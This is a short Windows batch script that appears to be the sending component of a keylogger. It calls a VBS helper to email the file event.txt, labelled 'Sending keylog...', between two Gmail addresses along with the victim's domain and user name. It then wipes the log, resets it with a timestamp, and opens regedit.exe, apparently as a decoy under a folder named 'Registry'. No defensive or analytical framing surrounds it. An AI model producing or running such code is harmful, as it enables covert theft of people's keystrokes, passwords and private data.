@echo off
cd /d %USERPROFILE%\Documents\Registry
wscript.exe "%USERPROFILE%\Documents\Registry\sender.vbs" "siuntejas@gmail.com" "gavejas@gmail.com" "%userdomain% %username%" "Sending keylog..." "%USERPROFILE%\Documents\Registry\event.txt"
timeout 5
del event.txt
@echo %date% %time% > event.txt
start regedit.exe